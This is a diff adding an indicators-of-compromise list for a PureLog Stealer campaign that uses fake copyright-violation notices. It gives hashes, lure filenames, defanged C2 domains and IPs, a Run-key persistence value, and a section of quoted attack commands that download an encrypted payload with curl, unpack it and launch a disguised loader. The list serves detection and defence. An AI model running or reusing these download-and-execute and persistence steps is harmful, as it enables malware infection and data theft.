@@ -1,0 +1,102 @@
+Copyright Lures Mask a Multi‑Stage PureLog Stealer Attack on Key Industries
+====================================================================================================
+Indicators of Compromise
+====================================================================================================
+
+instructions.pdf: e675bc054481bdca6f8cd1d561869e18712dc05a42e5c24b9add7679efc7faf6 (SHA1: 551e62437edab9e496ed3339f10a15cd35e3e819) as Trojan.Python.DROPPER.C
+
+Extracted_decoded_payload.bin (SHA1: d2e8d615e7c1a810993088a8c9291e0a4a7ed4c8) as Trojan.MSIL.PURELOGSSTEALER.A
+
+====================================================================================================
+Malicious Files and Artifacts
+====================================================================================================
+
+Notice of Alleged Violation of Intellectual Property Rights_1770380091603.zip (malicious lure) 
+
+Notice of Alleged Violation of Intellectual Property Rights.exe (renamed ADNotificationManager.exe) 
+
+Dokumentation über Verstöße gegen Rechte des geistigen Eigentums.exe (German lure) 
+
+_document.pdf (decoy document) 
+
+_invoice.pdf (encrypted payload masquerading as PDF) 
+
+_FILE_2025년_재직증명서_원본.png (renamed WinRAR executable) 
+
+C:\Users\Public\Windows\svchost.exe (Python loader, not legitimate system binary) 
+
+instructions.pdf (payload container, not a real PDF) 
+
+Dgrfauysx.exe and Fsywsuac.exe (base64/XOR-encoded .NET loader payloads) 
+
+Multiple DLLs and PYD files created under C:\Users\Public\Windows\DLLs\ (e.g., python314.dll, _ctypes.pyd, libffi-8.dll, _hashlib.pyd, libcrypto-3.dll, _socket.pyd, _ssl.pyd, libssl-3.dll, _bz2.pyd, _lzma.pyd, _zstd.pyd) 
+
+====================================================================================================
+Registry Persistence
+====================================================================================================
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\systemsettings 
+
+Value: conhost.exe --headless "C:\Users\Public\Windows\svchost.exe" "C:\Users\Public\Windows\instructions.pdf" 
+
+====================================================================================================
+Malicious Commands
+====================================================================================================
+
+cmd.exe /c start "" "._\document.pdf" 
+
+curl -A "curl/meow_meow" -s -k -L "hxxps://quickdocshare[.]com/DQ" -o "._\invoice.pdf" 
+
+curl -A "curl/meow_meow" -s -k -L "hxxps://quickdocshare[.]com/DQ/key" 
+
+"._\FILE_2025년_재직증명서_원본.png" x -p"%i" "._\invoice.pdf" "C:\Users\Public" -y 
+
+del "._\invoice.pdf" 
+
+cd "C:\Users\Public\Windows" 
+
+"C:\Users\Public\Windows\svchost.exe" "instructions.pdf" 
+
+====================================================================================================
+Malicious Domains and URLs
+====================================================================================================
+
+hxxps://cdn[.]eideasrl[.]it/Notice%20of%20Alleged%20Violation%20of%20Intellectual%20Property%20Rights_1770380091603[.]zip 
+
+hxxps://quickdocshare[.]com/DQ 
+
+hxxps://quickdocshare[.]com/DQ/key - Disease Vector
+
+hxxps://transfer[.]af-k[.]de:443/webdownload?deliveryUuid=a43da640-777f-40c0-95de-64987150c869 - Disease Vector
+
+dq[.]bestshoppingday[.]com 
+
+logs[.]bestshopingday[.]com 
+
+logs[.]bestsaleshoppingday[.]com 
+
+mh[.]bestshopingday[.]com 
+
+Malicious IP Addresses: 
+
+166[.]0[.]184[.]127 (PureLog Stealer C&C server) 
+
+172[.]64[.]80[.]1 
+
+64[.]40[.]154[.]96 
+
+====================================================================================================
+Malware Hashes
+====================================================================================================
+
+svchost.exe (SHA1: f4532fc1e5d53a732fcc883f7125ceb06b985048) 
+
+Notice of Alleged Violation of Intellectual Property Rights.exe (SHA256: 1539dab6099d860add8330bf2a008a4b6dc05c71f7b4439aebf431e034e5b6ff) 
+
+urlmon.dll (shellcodeloader) (SHA256: ac591adea9a2305f9be6ae430996afd9b7432116f381b638014a0886a99c6287) - Trojan.Win64.SHELLCODERUNNER.MF  
+
+Python loader (SHA256: e675bc054481bdca6f8cd1d561869e18712dc05a42e5c24b9add7679efc7faf6) 
+
+Dgrfauysx.exe SHA1: d2e8d615e7c1a810993088a8c9291e0a4a7ed4c8 
+
+Fsywsuac.exe SHA1: d874c3654bfb4fbf0c7c069f6e5b7ebd930415d0
